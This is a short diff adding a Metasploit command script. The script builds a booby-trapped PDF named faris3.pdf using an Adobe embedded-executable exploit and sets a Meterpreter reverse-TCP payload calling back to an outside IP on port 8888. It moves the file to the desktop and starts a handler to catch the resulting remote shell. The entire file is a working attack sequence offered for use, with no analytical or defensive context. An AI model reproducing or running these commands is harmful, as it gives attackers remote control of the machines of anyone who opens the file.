@@ -1,0 +1,29 @@
+use exploit/windows/fileformat/adobe_pdf_embedded_exe_nojs
+
+show options
+
+set FILENAME faris3.pdf
+
+set payload windows/meterpreter/reverse_tcp
+
+set LHOST 140.213.11.223
+
+set LPORT 8888
+
+run
+
+mv /Users/macair/.msf4/local/faris3.pdf /Users/macair/Desktop/
+
+use multi/handler
+
+back
+
+use multi/handler
+
+set payload windows/meterpreter/reverse_tcp
+
+set LHOST 140.213.11.223
+
+set LPORT 8888
+
+run
